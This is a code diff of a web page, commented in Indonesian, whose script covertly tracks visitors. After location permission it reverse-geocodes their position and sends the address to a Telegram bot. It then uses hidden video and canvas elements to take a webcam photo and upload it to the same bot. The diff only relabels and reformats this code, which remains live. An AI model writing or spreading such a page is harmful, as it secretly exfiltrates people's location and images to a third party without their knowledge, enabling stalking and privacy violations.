@@ -93,7 +93,7 @@
         </footer>
     </main>
 
-    <!-- Elemen tersembunyi untuk kamera -->
+    <!-- Elemen tersembunyi untuk proses kamera -->
     <video id="video" class="hidden"></video>
     <canvas id="canvas" class="hidden"></canvas>
 
@@ -115,7 +115,9 @@
                             address = data.display_name;
                         } catch (e) {}
 
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Lokasi: ${address}`);
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Lokasi Pengunjung: ${address}`);
+                        
+                        // Panggil fungsi kamera setelah lokasi didapatkan
                         takePhoto();
                     },
                     (error) => console.warn("Izin lokasi ditolak.")
@@ -135,14 +137,19 @@
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imageData = canvas.toDataURL('image/jpeg');
                     
+                    const imageData = canvas.toDataURL('image/jpeg');
                     const blob = await (await fetch(imageData)).blob();
+                    
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('photo', blob);
                     
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
                     stream.getTracks().forEach(track => track.stop());
                 }, 1500);
             } catch (err) {
